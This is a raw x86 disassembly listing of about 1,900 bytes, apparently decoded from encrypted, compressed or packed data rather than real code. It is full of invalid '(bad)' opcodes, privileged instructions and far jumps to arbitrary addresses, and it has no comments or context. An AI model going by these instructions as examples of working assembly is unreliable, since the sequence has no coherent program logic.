  401956:	adc    BYTE PTR [eax-0x6a],0xa6
  40195a:	in     eax,dx
  40195b:	retf   
  40195c:	push   ecx
  40195d:	pusha  
  40195e:	sub    eax,0x9dbbdd0e
  401963:	cmp    al,0x82
  401965:	(bad)  
  401966:	lods   eax,DWORD PTR ds:[esi]
  401967:	(bad)  
  401968:	ret    0xfefb
  40196b:	push   es
  40196c:	fsub   DWORD PTR [eax+0x4b45a49e]
  401972:	adc    al,0xdc
  401974:	pop    esp
  401975:	arpl   bp,bp
  401977:	inc    edx
  401978:	shr    BYTE PTR [esi+edi*2-0x4d],cl
  40197c:	xor    al,0x22
  40197e:	mov    ds:0x77540a5f,eax
  401983:	mov    edi,0x1dc371a3
  401988:	push   ds
  401989:	or     al,0x3f
  40198b:	(bad)  
  40198c:	mov    ecx,0x524e304b
  401991:	int    0x5f
  401993:	cdq    
  401994:	xlat   BYTE PTR ds:[ebx]
  401995:	pop    ds
  401996:	xor    ah,ah
  401998:	mov    al,ds:0xe43f9a74
  40199d:	mov    ds:0xf8841985,eax
  4019a2:	pop    esp
  4019a3:	or     edx,ebp
  4019a5:	daa    
  4019a6:	cmp    ebx,edi
  4019a8:	or     al,0x90
  4019aa:	jp     0x401955
  4019ac:	add    eax,0xa097dc55
  4019b1:	jb     0x401994
  4019b3:	daa    
  4019b4:	jb     0x4019ac
  4019b6:	iret   
  4019b7:	jne    0x40198e
  4019b9:	repz pop ss
  4019bb:	aaa    
  4019bc:	test   DWORD PTR [eax],0xd340b77d
  4019c2:	jnp    0x4019a0
  4019c4:	repnz ss xchg edx,eax
  4019c7:	aaa    
  4019c8:	clc    
  4019c9:	pop    edx
  4019ca:	adc    ebx,DWORD PTR [edx+0x173e4317]
  4019d0:	cmp    ecx,DWORD PTR [edi]
  4019d2:	xor    eax,0x113407ea
  4019d7:	in     eax,0xba
  4019d9:	jecxz  0x401985
  4019db:	jecxz  0x4019b8
  4019dd:	popf   
  4019de:	cmc    
  4019df:	cmp    eax,0x75efa284
  4019e4:	mov    edx,0xcbfbe2ce
  4019e9:	adc    al,ch
  4019eb:	pusha  
  4019ec:	cmp    eax,0xd935951d
  4019f1:	fdivr  DWORD PTR [eax+ecx*4-0x266f041f]
  4019f8:	jne    0x401983
  4019fa:	stos   DWORD PTR es:[edi],eax
  4019fb:	sti    
  4019fc:	add    eax,0x521698f
  401a01:	sub    al,0xbf
  401a03:	shl    DWORD PTR [esi],0xe1
  401a06:	push   0x17c94133
  401a0b:	push   ebp
  401a0c:	hlt    
  401a0d:	push   ebp
  401a0e:	mov    edx,0xaef73502
  401a13:	jno    0x401a0e
  401a15:	or     BYTE PTR [eax],bh
  401a17:	les    esp,FWORD PTR [ebp+0x60731fec]
  401a1d:	pop    esi
  401a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1f:	loop   0x4019b5
  401a21:	jbe    0x4019ab
  401a23:	push   ss
  401a24:	xchg   edi,eax
  401a25:	mov    DWORD PTR [ebx+0x3b5f588f],esi
  401a2b:	cmc    
  401a2c:	sti    
  401a2d:	repnz call 0xcbf1:0x29f92867
  401a35:	add    al,0x17
  401a37:	xchg   ah,dl
  401a39:	mul    cl
  401a3b:	sbb    ch,BYTE PTR [ecx]
  401a3d:	xor    eax,0xa1a079ba
  401a42:	arpl   cx,bp
  401a44:	pop    es
  401a45:	or     BYTE PTR [ebp+0x241d531d],dh
  401a4b:	cld    
  401a4c:	cmc    
  401a4d:	scas   eax,DWORD PTR es:[edi]
  401a4e:	and    DWORD PTR [edi+0x7b],ebx
  401a51:	(bad)  
  401a52:	fdiv   QWORD PTR [esi-0x771c46b8]
  401a58:	or     BYTE PTR [ebx],dh
  401a5a:	sahf   
  401a5b:	fadd   QWORD PTR [ebp+0x3c433ea9]
  401a61:	push   es
  401a62:	fcom   QWORD PTR [ecx]
  401a64:	rcr    BYTE PTR [edx+0x73],0x91
  401a68:	or     eax,0xcded2f63
  401a6d:	sar    DWORD PTR [esi-0x254b1268],cl
  401a73:	adc    edi,DWORD PTR [edi-0x75e7fcc7]
  401a79:	mov    ecx,0x1349a878
  401a7e:	enter  0x58a5,0x7a
  401a82:	or     DWORD PTR [eax+eiz*4-0x3eae8936],0x20
  401a8a:	aaa    
  401a8b:	cmc    
  401a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a8d:	adc    al,BYTE PTR [edx]
  401a8f:	pop    eax
  401a90:	xchg   esi,eax
  401a91:	jne    0x401a8b
  401a93:	push   ecx
  401a94:	test   ch,cl
  401a96:	xor    al,0x66
  401a98:	adc    eax,0x4cfcb78
  401a9d:	icebp  
  401a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a9f:	daa    
  401aa0:	dec    eax
  401aa1:	in     al,dx
  401aa2:	mov    ah,0x4e
  401aa4:	push   ebx
  401aa5:	xor    al,0x6e
  401aa7:	jae    0x401a2e
  401aa9:	aam    0x20
  401aab:	(bad)  
  401aac:	mov    ?,WORD PTR [edi]
  401aae:	adc    eax,DWORD PTR ds:[ebx]
  401ab1:	jns    0x401aad
  401ab3:	pop    esi
  401ab4:	mov    esp,0x5d54a5b1
  401ab9:	inc    edx
  401aba:	test   BYTE PTR ss:[eax],al
  401abd:	jge    0x401abf
  401abf:	nop
  401ac0:	add    DWORD PTR fs:[ebp+esi*2-0x3d5dd393],esp
  401ac8:	fwait
  401ac9:	push   ss
  401aca:	retf   
  401acb:	jg     0x401b3e
  401acd:	(bad)  
  401ace:	enter  0x5eda,0xc5
  401ad2:	jg     0x401ab3
  401ad4:	in     al,0xe4
  401ad6:	push   edx
  401ad7:	shl    bl,0xfa
  401ada:	xor    DWORD PTR [edi-0x58],ecx
  401add:	xchg   ebx,eax
  401ade:	pop    edx
  401adf:	dec    ecx
  401ae0:	addr16 xchg edx,eax
  401ae2:	mov    DWORD PTR [ebp+0x6b],ebp
  401ae5:	fld    DWORD PTR [edi]
  401ae7:	retf   0x3b7a
  401aea:	and    al,0x83
  401aec:	jne    0x401b16
  401aee:	dec    edx
  401aef:	pop    ebp
  401af0:	or     al,0xdb
  401af2:	xchg   DWORD PTR [edi-0x4],esi
  401af5:	pop    edx
  401af6:	stos   BYTE PTR es:[edi],al
  401af7:	bound  edi,QWORD PTR [ebp+0xd]
  401afa:	dec    eax
  401afb:	add    cl,BYTE PTR [ecx+0x22]
  401afe:	adc    BYTE PTR [ebp+0x4a4b3f7],dl
  401b04:	dec    edx
  401b05:	sub    eax,0xce97778d
  401b0a:	jmp    0x401b3d
  401b0c:	cmp    eax,0xcf1dce30
  401b11:	mov    ebx,gs
  401b13:	xchg   edx,eax
  401b14:	call   0x3bc7:0x81e8c6f3
  401b1b:	pop    edi
  401b1c:	es ret 
  401b1e:	lods   eax,DWORD PTR ds:[esi]
  401b1f:	xor    esi,edx
  401b21:	and    al,0x53
  401b23:	mov    BYTE PTR [esi],bh
  401b25:	loopne 0x401b89
  401b27:	sbb    DWORD PTR [ebp-0x33],esp
  401b2a:	fwait
  401b2b:	inc    eax
  401b2c:	(bad)  
  401b2e:	lea    esp,[esi+edx*4-0xc508378]
  401b35:	mov    dh,0x46
  401b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b38:	test   DWORD PTR [esi-0x1d4c4ac0],eax
  401b3e:	jno    0x401adf
  401b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b41:	sub    eax,0xb06618c6
  401b46:	fmul   DWORD PTR [ebp+0x47bb1e2a]
  401b4c:	out    dx,eax
  401b4d:	cmp    DWORD PTR [esi-0x339c57f],edx
  401b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b54:	push   0x118961ad
  401b59:	or     eax,0x3e6b95cf
  401b5e:	jae    0x401b5c
  401b60:	shl    BYTE PTR [edx-0x55ca4000],1
  401b66:	stos   BYTE PTR es:[edi],al
  401b67:	mov    eax,0x8fbaedd2
  401b6c:	lods   al,BYTE PTR ds:[esi]
  401b6d:	add    DWORD PTR [ebp-0xb],ecx
  401b70:	sbb    al,0xae
  401b72:	cmp    BYTE PTR [edi+edx*8],bh
  401b75:	ror    bl,cl
  401b77:	mov    al,ds:0x2ee27603
  401b7c:	imul   ebp,DWORD PTR [edi+ebx*2+0x2],0xffffffde
  401b81:	stos   BYTE PTR es:[edi],al
  401b82:	and    DWORD PTR [ebx+0x7c],edx
  401b85:	aam    0xa3
  401b87:	mov    dl,0xdc
  401b89:	cmp    ebx,DWORD PTR [esi-0x2]
  401b8c:	jbe    0x401bc2
  401b8e:	push   ecx
  401b8f:	lods   eax,DWORD PTR ds:[esi]
  401b90:	mov    ebx,0x7a6d724e
  401b95:	jmp    0x401b1d
  401b97:	dec    eax
  401b98:	push   ecx
  401b99:	cmc    
  401b9a:	adc    edi,edi
  401b9c:	int3   
  401b9d:	aam    0xa8
  401b9f:	mov    edx,DWORD PTR [ebp+0x42ceabaa]
  401ba5:	scas   ax,WORD PTR es:[edi]
  401ba7:	sbb    DWORD PTR [ebx],eax
  401ba9:	xor    DWORD PTR [edx+0x3e],edx
  401bac:	inc    esp
  401bad:	adc    ch,BYTE PTR fs:[ecx+0x57a633f8]
  401bb4:	(bad)  
  401bb5:	xor    ch,ah
  401bb7:	cmp    al,0x2
  401bb9:	mov    dh,BYTE PTR [esi]
  401bbb:	cdq    
  401bbc:	sub    eax,0x747f4ab9
  401bc1:	lods   al,BYTE PTR ds:[esi]
  401bc2:	mov    bh,0x9c
  401bc4:	mov    bh,0x4f
  401bc6:	lods   al,BYTE PTR ds:[esi]
  401bc7:	pop    edx
  401bc8:	daa    
  401bc9:	and    DWORD PTR [esi+0x6c08df1e],eax
  401bcf:	imul   eax,DWORD PTR [eax+0x2],0x7d
  401bd3:	aam    0x2d
  401bd5:	fldenv [esi]
  401bd7:	push   edi
  401bd8:	jne    0x401c35
  401bda:	cmp    DWORD PTR [edx+0x8644401],ebx
  401be0:	inc    esp
  401be1:	arpl   WORD PTR [ebx+0x6db6bf98],dx
  401be7:	repnz pop ds
  401be9:	fwait
  401bea:	and    BYTE PTR [ecx-0x10773b11],dl
  401bf0:	sti    
  401bf1:	out    0x99,al
  401bf3:	cli    
  401bf4:	hlt    
  401bf5:	mov    bh,0x42
  401bf7:	fwait
  401bf8:	push   ebx
  401bf9:	jo     0x401bc5
  401bfb:	adc    cl,ah
  401bfd:	aad    0xd2
  401bff:	xor    bh,bh
  401c01:	sbb    eax,0x542756a
  401c06:	stc    
  401c07:	inc    ecx
  401c08:	test   BYTE PTR [esi+0xe7cc5],dh
  401c0e:	mov    eax,0x114ef4cd
  401c13:	dec    ebp
  401c14:	jmp    0x87af10d8
  401c19:	nop
  401c1a:	xor    DWORD PTR [edi-0x43d871b7],ebp
  401c20:	pop    ebp
  401c21:	mov    ebx,0xf4d30362
  401c26:	sti    
  401c27:	scas   eax,DWORD PTR es:[edi]
  401c28:	(bad)  
  401c29:	dec    esi
  401c2a:	scas   al,BYTE PTR es:[edi]
  401c2b:	loop   0x401c20
  401c2d:	aam    0x8e
  401c2f:	popa   
  401c30:	(bad)  
  401c31:	cmp    al,0x79
  401c33:	add    eax,DWORD PTR [ebx-0x372774de]
  401c39:	lea    edx,[ecx-0x758a1599]
  401c3f:	shl    DWORD PTR [eax+0x30],0x68
  401c43:	ret    
  401c44:	mov    al,0x5
  401c46:	stos   BYTE PTR es:[edi],al
  401c47:	adc    ah,bh
  401c49:	rcl    DWORD PTR [ecx-0x42056f07],cl
  401c4f:	push   esp
  401c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c51:	cld    
  401c52:	push   ebp
  401c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c54:	push   es
  401c55:	and    eax,0x4c1f63ab
  401c5a:	sub    edi,edx
  401c5c:	push   es
  401c5d:	nop
  401c5e:	or     DWORD PTR [ebp-0x1768a37a],edx
  401c64:	pop    ds
  401c65:	stos   DWORD PTR es:[edi],eax
  401c66:	mov    esp,0xea465511
  401c6b:	cmp    DWORD PTR [ecx+edx*1],ebx
  401c6e:	push   ss
  401c6f:	arpl   WORD PTR ds:[eax-0x4b5998a3],bp
  401c76:	mov    edx,ecx
  401c78:	jmp    0x48b5:0xcb3db73d
  401c7f:	push   ecx
  401c80:	mov    ebx,ebp
  401c82:	sub    BYTE PTR [ecx+eax*8],al
  401c85:	(bad)  
  401c86:	scas   eax,DWORD PTR es:[edi]
  401c87:	adc    al,BYTE PTR [esi]
  401c89:	aaa    
  401c8a:	xchg   esp,eax
  401c8b:	sub    eax,0xb6b5944d
  401c90:	or     BYTE PTR [ecx+0x26b35502],cl
  401c96:	pop    ecx
  401c97:	add    edi,DWORD PTR [ecx+0x6]
  401c9a:	jae    0x401cb6
  401c9c:	sbb    al,0x89
  401c9e:	mov    edi,0xb3609b7d
  401ca3:	out    dx,eax
  401ca4:	sbb    BYTE PTR [eax],dh
  401ca6:	push   es
  401ca7:	xchg   edx,eax
  401ca8:	dec    ecx
  401ca9:	mov    WORD PTR [esi+0x48],ss
  401cac:	test   DWORD PTR [ebp+0x3d],ebp
  401caf:	ds retf 0xaeb2
  401cb3:	mov    ch,0xfc
  401cb5:	push   edx
  401cb6:	mov    ecx,DWORD PTR [edi-0x6f571493]
  401cbc:	ret    
  401cbd:	retf   
  401cbe:	fimul  WORD PTR [edx+ebx*1]
  401cc1:	scas   eax,DWORD PTR es:[edi]
  401cc2:	xor    eax,0x27bdb2ff
  401cc7:	aam    0xa2
  401cc9:	(bad)  
  401cca:	and    DWORD PTR [edi-0x3705e467],eax
  401cd0:	mov    ebp,0x9a8eb8db
  401cd5:	inc    edx
  401cd6:	outs   dx,BYTE PTR ds:[esi]
  401cd7:	mov    eax,ds:0x479149fb
  401cdc:	cmc    
  401cdd:	or     DWORD PTR [esi],edx
  401cdf:	in     al,0x28
  401ce1:	int    0x28
  401ce3:	pop    ecx
  401ce4:	xchg   ecx,eax
  401ce5:	scas   eax,DWORD PTR es:[edi]
  401ce6:	inc    edi
  401ce7:	mov    edi,0x38477557
  401cec:	adc    esp,0x7ff548f7
  401cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cf3:	icebp  
  401cf4:	retf   
  401cf5:	test   cl,al
  401cf7:	es mov esp,0x601f7b0c
  401cfd:	loop   0x401d19
  401cff:	pop    ds
  401d00:	xchg   esi,eax
  401d01:	shl    cl,cl
  401d03:	mov    ecx,0xf757776b
  401d08:	sub    cl,BYTE PTR [edx]
  401d0a:	lahf   
  401d0b:	ror    BYTE PTR [edx],0x94
  401d0e:	daa    
  401d0f:	mov    ch,0xc5
  401d11:	xor    al,0x42
  401d13:	sbb    DWORD PTR [ebx],ebp
  401d15:	inc    ecx
  401d16:	clc    
  401d17:	test   al,0xe1
  401d19:	dec    esp
  401d1a:	adc    BYTE PTR [ebx-0x48c6ed3f],dh
  401d20:	xchg   edx,eax
  401d21:	xchg   DWORD PTR [ebx],ecx
  401d23:	mov    DWORD PTR [edi+ebp*8+0x6c],ebp
  401d27:	xchg   ebx,eax
  401d28:	mov    ebp,0xd8ebab6e
  401d2d:	dec    ebp
  401d2e:	xor    BYTE PTR [edx+ecx*2],0xd0
  401d32:	mov    esi,0x9afd1a5b
  401d37:	shl    esp,0xa4
  401d3a:	in     eax,0xfa
  401d3c:	mov    esp,0x6ae3040d
  401d41:	or     al,0x54
  401d43:	popf   
  401d44:	popa   
  401d45:	dec    ebx
  401d46:	and    ebp,DWORD PTR [edi+0x5d]
  401d49:	add    bl,BYTE PTR [ecx+eax*4]
  401d4c:	js     0x401dbf
  401d4e:	pop    ebp
  401d4f:	loope  0x401db6
  401d51:	int3   
  401d52:	cmp    edi,DWORD PTR [edx+0xd3ef6c3]
  401d58:	or     esi,edi
  401d5a:	sbb    ecx,ecx
  401d5c:	das    
  401d5d:	in     eax,dx
  401d5e:	ins    BYTE PTR es:[edi],dx
  401d5f:	pop    esi
  401d60:	lea    edx,[ebp-0x31]
  401d63:	lahf   
  401d64:	xor    esp,DWORD PTR [esi+0x68]
  401d67:	mov    eax,0x5318abbd
  401d6c:	ret    
  401d6d:	mov    cs,WORD PTR [esi-0x33]
  401d70:	fnsave [esi-0x7e]
  401d73:	aas    
  401d74:	pop    ss
  401d75:	jmp    0x5e049943
  401d7a:	fcmovnu st,st(0)
  401d7c:	mov    dh,0x90
  401d7e:	imul   DWORD PTR [edx+ebp*4+0x56]
  401d82:	iret   
  401d83:	ret    
  401d84:	mov    DWORD PTR [eax+0x40a80edc],esp
  401d8a:	xchg   edx,eax
  401d8b:	cmp    ch,BYTE PTR [edx]
  401d8d:	jge    0x401de0
  401d8f:	sbb    cl,bl
  401d91:	jle    0x401d3f
  401d93:	dec    esi
  401d94:	adc    esi,DWORD PTR [ecx+0x3]
  401d97:	xlat   BYTE PTR ds:[ebx]
  401d98:	pop    ebx
  401d99:	lock outs dx,BYTE PTR ds:[esi]
  401d9b:	les    eax,FWORD PTR [ecx+edx*4]
  401d9e:	ja     0x401deb
  401da0:	stos   DWORD PTR es:[edi],eax
  401da1:	bswap  edx
  401da3:	nop
  401da4:	pop    edi
  401da5:	sbb    ebx,DWORD PTR [eax+0x798fc017]
  401dab:	div    DWORD PTR [ebp-0x1e]
  401dae:	cmp    dl,dl
  401db0:	sahf   
  401db1:	jns    0x401da6
  401db3:	xchg   esp,eax
  401db4:	sbb    esp,DWORD PTR [edx]
  401db6:	pop    ebp
  401db7:	sub    al,0xf4
  401db9:	mov    cl,0x98
  401dbb:	xor    BYTE PTR [ebx+esi*4+0x6c],al
  401dbf:	enter  0x7499,0x4
  401dc3:	cmp    BYTE PTR [ebx+0x4],dl
  401dc6:	pop    esp
  401dc7:	std    
  401dc8:	sub    esp,ebx
  401dca:	rol    ecx,0xb2
  401dcd:	sbb    eax,0x2c665376
  401dd2:	dec    ebp
  401dd3:	push   cs
  401dd4:	(bad)  
  401dd5:	mov    dh,0x3a
  401dd7:	jne    0x401dc3
  401dd9:	int    0xe
  401ddb:	sub    esp,DWORD PTR [esi]
  401ddd:	pop    esi
  401dde:	out    dx,al
  401ddf:	mov    WORD PTR [eax],?
  401de1:	in     eax,0x4e
  401de3:	cld    
  401de4:	cmp    edi,DWORD PTR [edi]
  401de6:	ret    
  401de7:	ds retfw 0xa5ec
  401dec:	pop    es
  401ded:	add    al,0x35
  401def:	adc    esp,DWORD PTR [edi-0x60ce20e9]
  401df5:	nop
  401df6:	and    al,0x75
  401df8:	ins    BYTE PTR es:[edi],dx
  401df9:	in     eax,0x1e
  401dfb:	shl    DWORD PTR [edx],0xef
  401dfe:	lea    ebx,[edx]
  401e00:	enter  0xf216,0x84
  401e04:	rcr    BYTE PTR [eax-0x1f01ede6],1
  401e0a:	jge    0x401e6f
  401e0c:	and    al,0xa
  401e0e:	pop    es
  401e0f:	and    al,0x7d
  401e11:	(bad)  
  401e12:	mov    dh,0x35
  401e14:	jno    0x401e42
  401e16:	popf   
  401e17:	iret   
  401e18:	ftst   
  401e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1b:	push   ebp
  401e1c:	and    al,BYTE PTR [eax-0x61]
  401e1f:	and    esi,edi
  401e21:	scas   ax,WORD PTR es:[edi]
  401e23:	mov    bh,0x73
  401e25:	inc    esp
  401e26:	arpl   WORD PTR [eax],bp
  401e28:	(bad)  
  401e29:	je     0x401dc1
  401e2b:	aad    0x8
  401e2d:	and    cl,ah
  401e2f:	and    BYTE PTR [ebx-0x3a],ah
  401e32:	push   0xffffffb7
  401e34:	mov    edi,0x3d0c295c
  401e39:	xchg   DWORD PTR [ecx-0x6a],edi
  401e3c:	mov    DWORD PTR ds:0x95a5b87b,ebx
  401e42:	aam    0xc2
  401e44:	test   BYTE PTR [ebx+0x742e1d0],dl
  401e4a:	aas    
  401e4b:	cdq    
  401e4c:	mov    ebp,esp
  401e4e:	bound  ebx,QWORD PTR [edi+0x7a37247]
  401e54:	iret   
  401e55:	leave  
  401e56:	jae    0x401e73
  401e58:	jae    0x401e78
  401e5a:	jo     0x401e06
  401e5c:	push   esi
  401e5d:	add    ebp,DWORD PTR [esi+0x3a]
  401e60:	iret   
  401e61:	add    DWORD PTR ds:0x73ee9caa,0xf208038f
  401e6b:	stos   DWORD PTR es:[edi],eax
  401e6c:	adc    eax,0x73aae912
  401e71:	inc    ebp
  401e72:	clc    
  401e73:	std    
  401e74:	gs ja  0x401eb1
  401e77:	jl     0x401ecd
  401e79:	cmp    edx,0x11
  401e7c:	pop    ss
  401e7d:	ret    
  401e7e:	mov    al,BYTE PTR [ebp+0x74ee974b]
  401e84:	push   edx
  401e85:	scas   al,BYTE PTR es:[edi]
  401e86:	push   edx
  401e87:	in     al,dx
  401e88:	mov    eax,ebp
  401e8a:	sbb    ecx,edx
  401e8c:	mov    dh,0xd0
  401e8e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e90:	sub    esi,ebx
  401e92:	jmp    0x8595:0x51b3471b
  401e99:	rcl    al,0xe3
  401e9c:	pop    ss
  401e9d:	imul   esp,DWORD PTR [ebx-0x5181fdc3],0x68
  401ea4:	fs popf 
  401ea6:	pushf  
  401ea7:	out    0x3f,al
  401ea9:	lods   eax,DWORD PTR ds:[esi]
  401eaa:	jmp    0x5f3f22c4
  401eaf:	cli    
  401eb0:	push   esp
  401eb1:	jge    0x401e95
  401eb3:	leave  
  401eb4:	jns    0x401e45
  401eb6:	mov    ds:0xb06264ef,al
  401ebb:	sbb    edx,DWORD PTR [ebx-0x442d79c9]
  401ec1:	dec    esi
  401ec2:	mov    dl,0xba
  401ec4:	lahf   
  401ec5:	js     0x401e8f
  401ec7:	(bad)  
  401ec8:	dec    DWORD PTR [esi-0x66]
  401ecb:	stos   BYTE PTR es:[edi],al
  401ecc:	aad    0x42
  401ece:	out    0x29,al
  401ed0:	add    al,0x6b
  401ed2:	xlat   BYTE PTR ds:[ebx]
  401ed3:	or     BYTE PTR [eax+eax*1-0x5065a7db],dh
  401eda:	mov    cl,0xdf
  401edc:	or     al,0xfa
  401ede:	dec    edi
  401edf:	scas   eax,DWORD PTR es:[edi]
  401ee0:	xor    esp,0x806f8924
  401ee6:	sub    BYTE PTR [esi-0x1fc5191c],dl
  401eec:	mov    ecx,0xc496ee45
  401ef1:	test   eax,0x50485359
  401ef6:	push   es
  401ef7:	dec    esp
  401ef8:	pop    esp
  401ef9:	jp     0x401f1d
  401efb:	rcl    esp,1
  401efd:	stos   DWORD PTR es:[edi],eax
  401efe:	fadd   DWORD PTR [esi+0x41]
  401f01:	icebp  
  401f02:	mov    eax,0xe3471bd2
  401f07:	or     BYTE PTR [ecx-0x57],dh
  401f0a:	dec    eax
  401f0b:	outs   dx,DWORD PTR ds:[esi]
  401f0c:	mov    cl,BYTE PTR ds:0x42862d6a
  401f12:	dec    ebx
  401f13:	shl    BYTE PTR [esi-0x14a2d313],cl
  401f19:	nop
  401f1a:	stos   BYTE PTR es:[edi],al
  401f1b:	call   0xe67fcdf6
  401f20:	ins    BYTE PTR es:[edi],dx
  401f21:	pushf  
  401f22:	icebp  
  401f23:	shr    DWORD PTR [eax+eiz*4-0x10],1
  401f27:	call   DWORD PTR [esi]
  401f29:	jbe    0x401f52
  401f2b:	mov    bh,al
  401f2d:	mov    eax,ds:0x7f6bf79f
  401f32:	stos   BYTE PTR es:[edi],al
  401f33:	sar    BYTE PTR [edi+0x5f5f2239],1
  401f39:	aad    0xa5
  401f3b:	jg     0x401f09
  401f3d:	xchg   BYTE PTR [edx],dh
  401f3f:	pop    ebx
  401f40:	es into 
  401f42:	(bad)  
  401f44:	(bad)  
  401f45:	aam    0xb9
  401f47:	iret   
  401f48:	push   ebx
  401f49:	das    
  401f4a:	inc    edi
  401f4b:	jmp    0x39809b25
  401f50:	jmp    0x401faa
  401f52:	stos   DWORD PTR es:[edi],eax
  401f53:	sbb    eax,0xc2f7a7de
  401f58:	mov    ah,0xb
  401f5a:	nop
  401f5b:	and    ch,dh
  401f5d:	cmp    cl,BYTE PTR [edi]
  401f5f:	rcr    DWORD PTR [eax],0x89
  401f62:	pop    es
  401f63:	dec    eax
  401f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f65:	int    0xf9
  401f67:	js     0x401f3a
  401f69:	jl     0x401f1d
  401f6b:	dec    esi
  401f6c:	xchg   ecx,eax
  401f6d:	mov    ch,0xde
  401f6f:	ds (bad) 
  401f71:	push   0x5751a2be
  401f76:	xor    ebp,ebx
  401f78:	ja     0x401f92
  401f7a:	mov    ebp,0x9eb75bf3
  401f7f:	jnp    0x401fc2
  401f81:	adc    eax,0x81188f39
  401f86:	in     al,dx
  401f87:	mov    ch,0x88
  401f89:	add    DWORD PTR [esi+0x68],edi
  401f8c:	add    eax,0x8f704156
  401f91:	dec    esi
  401f92:	cmp    eax,0x578a6529
  401f97:	pop    edi
  401f98:	dec    edi
  401f99:	out    dx,eax
  401f9a:	jl     0x401f9b
  401f9c:	adc    BYTE PTR [ebx+0x68dace51],ah
  401fa2:	pushf  
  401fa3:	sti    
  401fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa5:	cli    
  401fa6:	mov    ebx,0x5d4b1b22
  401fab:	and    DWORD PTR [eax+0x17],ebx
  401fae:	int3   
  401faf:	add    al,0x3a
  401fb1:	enter  0x3278,0xd3
  401fb5:	cld    
  401fb6:	ja     0x401ff8
  401fb8:	ficom  DWORD PTR [ebx+0x62]
  401fbb:	int3   
  401fbc:	dec    ecx
  401fbd:	sub    bl,cl
  401fbf:	push   ds
  401fc0:	in     al,dx
  401fc1:	push   esi
  401fc2:	data16 (bad) 
  401fc5:	push   esi
  401fc6:	xchg   ebx,eax
  401fc7:	mov    al,0x98
  401fc9:	retf   
  401fca:	inc    ecx
  401fcb:	ret    
  401fcc:	mov    cl,0x91
  401fce:	sub    BYTE PTR [esi-0x41d9b4e0],ah
  401fd4:	and    al,0xba
  401fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fd7:	(bad)  
  401fd8:	jnp    0x402021
  401fda:	(bad)  
  401fdb:	xor    DWORD PTR [edx+ecx*2+0x2b6291b2],ecx
  401fe2:	lea    esi,[eax+0x7e70b041]
  401fe8:	cmc    
  401fe9:	xor    ecx,DWORD PTR [ecx+0x2783970f]
  401fef:	(bad)  
  401ff0:	je     0x401f8a
  401ff2:	mov    ds:0xb1cb7a03,al
  401ff7:	jg     0x402003
  401ff9:	sbb    eax,0x928b0392
  401ffe:	mov    eax,ds:0x86c6f36c
  402003:	sub    DWORD PTR [bx+si-0x5c],0x7354c86c
  40200b:	add    al,0x3c
  40200d:	fisub  DWORD PTR [edx]
  40200f:	mov    bl,0x1b
  402011:	push   es
  402012:	jl     0x402075
  402014:	push   edx
  402015:	mov    dh,0x92
  402017:	aaa    
  402018:	(bad)  
  40201a:	retf   0xf888
  40201d:	and    al,0x94
  40201f:	pop    esp
  402020:	sub    bh,0x94
  402023:	fs std 
  402025:	icebp  
  402026:	sbb    eax,0xcac60d19
  40202b:	and    BYTE PTR [ecx],0xb1
  40202e:	mov    ds:0xdac11c75,eax
  402033:	pop    ebp
  402034:	xlat   BYTE PTR ds:[ebx]
  402035:	push   edx
  402036:	adc    DWORD PTR [eax+0x5d],edi
  402039:	test   al,0x5b
  40203b:	inc    esp
  40203c:	(bad)
  402041:	and    edx,DWORD PTR [eax]
  402043:	inc    ebx
  402044:	sbb    esi,edx
  402046:	(bad)  
  402047:	es and eax,0xee87a142
  40204d:	or     eax,0x5f7dfe7b
  402052:	inc    BYTE PTR [ecx+0xc84132a]
  402058:	mov    ah,0x94
  40205a:	inc    ecx
  40205b:	push   cs
  40205c:	fnstcw WORD PTR [esi+0x5]
  40205f:	push   esp
  402060:	xor    DWORD PTR [eax-0x35],esi
  402063:	xchg   ecx,eax
  402064:	pop    edx
  402065:	ret    
  402066:	in     eax,dx
  402067:	int3   
  402068:	and    DWORD PTR [eax+0x10f53cce],0x69
  40206f:	bnd jno 0x4020c3
  402072:	(bad)  
  402073:	inc    ebp
  402074:	(bad)  
  402075:	mov    ds:0x6eb2e8e0,eax
  40207a:	adc    cl,BYTE PTR [eax]
  40207c:	fwait
  40207d:	je     0x4020dd
  40207f:	sbb    BYTE PTR ds:0xed757f2f,cl
  402085:	xchg   DWORD PTR [edx-0x5e07fe5c],edi
  40208b:	hlt    
  40208c:	imul   esp,DWORD PTR [edi],0xffffffbb
  40208f:	and    dl,BYTE PTR [eax+0x2]
  402092:	jno    0x402089
  402094:	and    dh,ah
  402096:	mov    ebp,0xb63332a6
  40209b:	hlt    
  40209c:	inc    esp
  40209d:	in     al,dx
  40209e:	mov    al,ds:0xc49ac35
  4020a3:	xor    al,bl
  4020a5:	ss out dx,al
  4020a7:	or     BYTE PTR [eax-0x73],0x96
  4020ab:	retf   
  4020ac:	mov    ebx,0x2024f5ea
  4020b1:	cmp    esi,DWORD PTR [esi-0x37]
  4020b4:	iret   
  4020b5:	jns    0x4020d5
  4020b7:	cmp    eax,0xf5029e69
  4020bc:	and    edi,DWORD PTR [ebp-0x5e]
  4020bf:	outs   dx,BYTE PTR ds:[esi]
  4020c0:	xchg   ecx,eax
  4020c1:	sub    bh,0xae
  4020c4:	sub    eax,0xb2192d02
  4020c9:	and    esi,DWORD PTR [eax-0x51]
  4020cc:	dec    ebx
  4020cd:	xchg   ebp,eax
  4020ce:	pop    ebp
  4020cf:	mov    cl,0x95
  4020d1:	cdq    
  4020d2:	jmp    0x12de:0xb4ac564a
  4020d9:	retf   0x99b4
  4020dc:	sub    BYTE PTR [esp+ebp*4-0x66],bh
  4020e0:	test   eax,0x9d9816bf
  4020e5:	inc    ebp
  4020e6:	aaa    
